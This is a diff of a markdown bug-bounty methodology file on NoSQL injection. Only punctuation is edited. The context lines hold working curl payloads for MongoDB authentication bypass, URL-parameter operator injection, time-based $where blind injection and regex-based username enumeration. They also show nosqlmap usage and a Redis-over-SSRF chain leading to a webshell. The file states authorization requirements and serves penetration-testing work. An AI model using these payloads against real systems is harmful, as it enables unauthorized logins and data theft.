@@ -29,17 +29,17 @@ report_count: 14
 >
 > Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
 
-# HUNT-NOSQLI — NoSQL Injection
+# HUNT-NOSQLI: NoSQL Injection
 
 ## Crown Jewel Targets
 
 NoSQL injection is most valuable when it bypasses authentication (Critical) or leaks the entire user collection (High).
 
 **Highest-value chains:**
-- **MongoDB auth bypass** — `{"username": {"$gt": ""}, "password": {"$gt": ""}}` logs in as first user in collection (usually admin)
-- **$where JS injection** — if $where is enabled: blind injection → data exfil
-- **Redis command injection** — via SSRF or direct TCP, SLAVEOF attacker-ip → config write → webshell
-- **Elasticsearch injection** — _search endpoint with Groovy script injection (pre-5.0) → RCE
+- **MongoDB auth bypass**; `{"username": {"$gt": ""}, "password": {"$gt": ""}}` logs in as first user in collection (usually admin)
+- **$where JS injection**; if $where is enabled: blind injection → data exfil
+- **Redis command injection**; via SSRF or direct TCP, SLAVEOF attacker-ip → config write → webshell
+- **Elasticsearch injection**; _search endpoint with Groovy script injection (pre-5.0) → RCE
 
 ---
 
@@ -68,14 +68,14 @@ Any endpoint accepting JSON body with username/password
 
 ## Step-by-Step Hunting Methodology
 
-### Phase 1 — Auth Bypass (MongoDB)
+### Phase 1: Auth Bypass (MongoDB)
 ```bash
 # Operator injection in JSON body
 curl -s -X POST https://$TARGET/api/login \
   -H "Content-Type: application/json" \
   -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
 
-# Regex wildcard — match any username
+# Regex wildcard: match any username
 curl -s -X POST https://$TARGET/api/login \
   -H "Content-Type: application/json" \
   -d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'
@@ -91,7 +91,7 @@ curl -s -X POST https://$TARGET/api/login \
   -d '{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": "x"}}'
 ```
 
-### Phase 2 — URL Parameter Injection
+### Phase 2: URL Parameter Injection
 ```bash
 # Array notation (Express/PHP-style)
 curl --globoff 'https://<authorized-host>/api/users?username[$gt]=&password[$gt]='
@@ -102,7 +102,7 @@ curl "https://$TARGET/api/login" \
   --data 'username[$gt]=&password[$gt]='
 ```
 
-### Phase 3 — $where Blind Injection (time-based)
+### Phase 3: $where Blind Injection (time-based)
 ```bash
 # Test if $where is enabled (time-based detection, 5s delay)
 curl -s -X POST https://$TARGET/api/search \
@@ -116,7 +116,7 @@ curl -s -X POST https://$TARGET/api/search \
   -d '{"q": {"$where": "function(){if(this.username.match(/^a/)){sleep(3000);} return true;}"}}'
 ```
 
-### Phase 3b — Syntax injection into a concatenated `$where`/query (string context)
+### Phase 3b: Syntax injection into a concatenated `$where`/query (string context)
 When the app concatenates input into a JS `$where` STRING (`"this.name=='"+input+"'"`) instead of accepting an operator object, break the string rather than passing `$gt`/`$ne`. Fuzz first, then break:
 ```
 fuzz:  ' " ` { ; $         # a 500/behavior change is a lead, not proof of query execution
@@ -125,7 +125,7 @@ fuzz:  ' " ` { ; $         # a 500/behavior change is a lead, not proof of query
 ```
 (PortSwigger: Injecting syntax into NoSQL queries.)
 
-### Phase 4 — Data Dump via Regex
+### Phase 4: Data Dump via Regex
 ```bash
 # Enumerate usernames character by character
 for c in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
@@ -136,7 +136,7 @@ for c in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
 done
 ```
 
-### Phase 5 — Automation
+### Phase 5: Automation
 ```bash
 # nosqlmap
 pip3 install nosqlmap
@@ -146,7 +146,7 @@ nosqlmap -u "https://$TARGET/api/login" --attack 1
 nosqlmap -u "https://$TARGET/api/login" --attack 2
 ```
 
-### Phase 6 — Redis via SSRF
+### Phase 6: Redis via SSRF
 ```bash
 # If SSRF found, probe internal Redis via gopher://
 # Do not use FLUSHALL or configuration writes as a reachability test.
@@ -194,7 +194,7 @@ nosqlmap -u "https://$TARGET/api/login" --attack 2
 ## When to Use
 
 - You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
-- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.
+- You need the recon, exploitation, or validation workflow described below; executed strictly inside the approved scope.
 
 ## Limitations
 
